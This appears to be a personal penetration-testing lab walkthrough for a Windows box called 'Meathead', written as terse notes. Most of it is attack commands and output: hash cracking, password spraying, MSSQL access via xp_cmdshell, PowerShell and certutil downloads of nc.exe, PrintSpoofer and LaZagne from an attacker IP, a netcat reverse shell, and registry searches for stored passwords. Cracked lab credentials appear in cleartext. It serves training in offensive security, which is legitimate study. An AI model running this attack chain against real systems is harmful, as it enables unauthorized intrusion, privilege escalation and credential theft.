### FTP
```
cat palindromes.txt | sed -e 's/\"//g' -e 's/, /\n/g'
```

no luck above just crack it then.

```
hashcat -m 13000 --force -a 0 rar.hash /usr/share/wordlists/rockyou.txt
```

letmeinplease

### Extract the rar file then
sa
EjectFrailtyThorn425

### Ports scan since autorecon failed
```
docker run -it --rm --name rustscan rustscan/rustscan:1.10.0 192.168.243.70
```

PORT     STATE SERVICE        REASON
80/tcp   open  http           syn-ack
135/tcp  open  msrpc          syn-ack
139/tcp  open  netbios-ssn    syn-ack
445/tcp  open  microsoft-ds   syn-ack
1221/tcp open  sweetware-apps syn-ack
1435/tcp open  ibm-cics       syn-ack <- mssql
3389/tcp open  ms-wbt-server  syn-ack
5985/tcp open  wsman          syn-ack

### Mysql it
```
mysql -u sa -p'EjectFrailtyThorn425' -h $IP -P 1435
```

for u in $(cat names.txt); do mysql -u $u -p'EjectFrailtyThorn425' -h $IP -P 1435; done

for u in $(cat names.txt); do smbmap -u $u -p 'EjectFrailtyThorn425' -H $IP; done

crackmapexec smb $IP -u names.txt -p EjectFrailtyThorn425

crackmapexec winrm $IP -u names.txt -p EjectFrailtyThorn425

### Brute force it as mysql failed to conncect
```
crackmapexec winrm $IP -d Meathead -u -p EjectFrailtyThorn425
```

### ...LOL... Actually MSSQL
##### sqsh is working too.
❯ sqsh -S $IP:1435 -U sa -P EjectFrailtyThorn425
sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1> 

##### BUT mssqlclient is better!
```bash
❯ /usr/bin/impacket-mssqlclient sa@$IP -port 1435 -windows-auth
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[-] ERROR(MEATHEAD\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
                                                                                                                                                                                            
❯ /usr/bin/impacket-mssqlclient sa@$IP -port 1435
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(MEATHEAD\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(MEATHEAD\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> enable_xp_cmdshell
```

certutil failed. should go with iwr or smbserver
```
SQL> xp_cmdshell certutil -urlcache -f http://192.168.49.243/nc.exe c:\users\Public\nc.exe
[-] ERROR(MEATHEAD\SQLEXPRESS): Line 1: An error occurred during the execution of xp_cmdshell. A call to 'CreateProcess' failed with error code: '5'.
```

### Get foothold and root
```
xp_cmdshell c:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe Invoke-WebRequest "http://192.168.49.243/nc.exe" -OutFile "C:\Users\Public\Downloads\alvin.exe"

xp_cmdshell c:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe Invoke-WebRequest "http://192.168.49.243/PrintSpoofer64.exe" -OutFile "C:\Users\Public\Downloads\PrintSpoofer64.exe"

xp_cmdshell C:\Users\Public\Downloads\PrintSpoofer64.exe -c "C:\Users\Public\Downloads\alvin.exe 192.168.49.243 1435 -e cmd"
```

### Intened ways
##### Jane -> Admin
```
xp_cmdshell C:\Users\Public\Downloads\alvin.exe -e cmd 192.168.49.243 80
```

certutil -urlcache -f http://192.168.49.243:8080/lazagne.exe C:\Users\Public\lazagne.exe
certutil -urlcache -f http://192.168.49.243:8080/lazagne.exe C:\Users\Public\Downloads\lazagne.exe

nope, and IEX is for string. So go with IWR

```
powershell IEX(New-Object Net.WebClient).DownloadString('http://192.168.49.243:8080/lazagne.exe');
powershell IEX(New-Object Net.WebClient).DownloadString('http://192.168.49.243:5985/lazagne.exe');
```

```
powershell IWR http://192.168.49.243:5985/lazagne.exe -OutFile alvinLZG.exe <- Defender deleted it, so does some payloads generated by msf

C:\Users\Public\Downloads\lazagne.exe
```

##### Try SessionGopher
powershell IWR http://192.168.49.243:5985/SessionGopher.ps1 -OutFile alvin.ps1
But nothing
```
PS C:\Users\Public\Downloads> Import-Module .\alvin.ps1
Import-Module .\alvin.ps1
PS C:\Users\Public\Downloads> Invoke-SessionGopher -Target Meathead
Invoke-SessionGopher -Target Meathead

          o_       
         /  ".   SessionGopher
       ,"  _-"      
     ,"   m m         
  ..+     )      Brandon Arvanaghi
     `m..m       Twitter: @arvanaghi | arvanaghi.com
  
[+] Digging on Meathead...
PS C:\Users\Public\Downloads> dir
```

##### Either winpeas or mannaully to get credentials
search the registry fo key names and passwords
```
reg query HKLM /f pass /t REG_SZ /s
```

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control
    CurrentPass    REG_SZ    TwilightAirmailMuck234


### 3389 to Jane
Verify the version of Plantronics and exploit it with [47845](https://www.exploit-db.com/exploits/47845)

View -> Details -> check the box 'Hidden items'

jane|advertise|C:\Windows\System32\cmd.exe
